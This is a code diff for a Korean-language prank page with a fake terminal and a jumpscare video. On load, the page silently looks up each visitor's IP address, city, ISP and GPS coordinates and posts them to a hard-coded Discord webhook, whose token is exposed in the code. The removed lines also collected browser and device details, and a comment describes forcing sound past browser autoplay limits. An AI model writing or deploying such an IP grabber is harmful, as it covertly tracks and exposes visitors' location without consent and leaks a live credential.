@@ -15,7 +15,6 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            cursor: pointer;
         }
 
         #terminal {
@@ -72,56 +71,36 @@
         <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
     </div>
 
+    <!-- 비디오 파일에서 소리만 빼서 무한 반복 -->
     <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>
 
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
 
-        // 1. 접속 즉시 상세 데이터 수집 및 웹훅 전송
-        async function sendData() {
-            try {
-                const ipRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
-                const ipData = await ipRes.json();
+        // IP 및 세부 정보 추출 API (ip-api 사용)
+        fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query')
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === 'success') {
+                    const messageContent = `🎯 **새로운 타겟 포착!**
+> **IP 주소:** \`${data.query}\`
+> **국가/도시:** ${data.country} / ${data.regionName} / ${data.city}
+> **통신사(ISP):** ${data.isp} (${data.org})
+> **위치 좌표:** 위도 ${data.lat}, 경도 ${data.lon}
+> **타임존:** ${data.timezone}`;
 
-                const deviceInfo = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    cores: navigator.hardwareConcurrency || '알 수 없음',
-                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '알 수 없음'
-                };
-
-                let payloadContent = `🚨 **타겟 전면 분석 데이터 포착!**\n`;
-                if(ipData.status === 'success') {
-                    payloadContent += `> **IP 주소:** \`${ipData.query}\`\n` +
-                                      `> **국가 / 도시:** ${ipData.country} / ${ipData.regionName} / ${ipData.city} (우편번호: ${ipData.zip})\n` +
-                                      `> **통신사(ISP):** ${ipData.isp} (${ipData.org})\n` +
-                                      `> **AS번호:** ${ipData.as}\n` +
-                                      `> **위치 좌표:** 위도 ${ipData.lat}, 경도 ${ipData.lon}\n` +
-                                      `> **타임존:** ${ipData.timezone}\n`;
-                } else {
-                    payloadContent += `> **IP 위치 조회 실패**\n`;
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: messageContent
+                        })
+                    }).catch(err => console.error(err));
                 }
-
-                payloadContent += `> **플랫폼/OS:** ${deviceInfo.platform}\n` +
-                                  `> **사용 언어:** ${deviceInfo.language}\n` +
-                                  `> **화면 해상도:** ${deviceInfo.screen}\n` +
-                                  `> **CPU 코어 수:** ${deviceInfo.cores}\n` +
-                                  `> **디바이스 메모리:** ${deviceInfo.memory}\n` +
-                                  `> **브라우저 정보:** \`${deviceInfo.ua}\``;
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: payloadContent })
-                });
-            } catch (e) {
-                console.error(e);
-            }
-        }
-
-        sendData();
+            })
+            .catch(() => {});
 
         const term = document.getElementById('terminal');
         const jump = document.getElementById('jumpscare');
@@ -148,12 +127,8 @@
                     term.style.display = 'none';
                     jump.style.display = 'block';
 
-                    // 브라우저 정책 우회를 위한 강제 재생 시도
-                    sound.play().catch(() => {
-                        // 터치나 클릭 시 무조건 소리 터지도록 바인딩
-                        window.addEventListener('click', () => sound.play(), { once: true });
-                        window.addEventListener('touchstart', () => sound.play(), { once: true });
-                    });
+                    // 플래시와 함께 소리 재생
+                    sound.play().catch(e => console.log("Audio play blocked:", e));
 
                     setTimeout(() => {
                         jump.style.display = 'none';
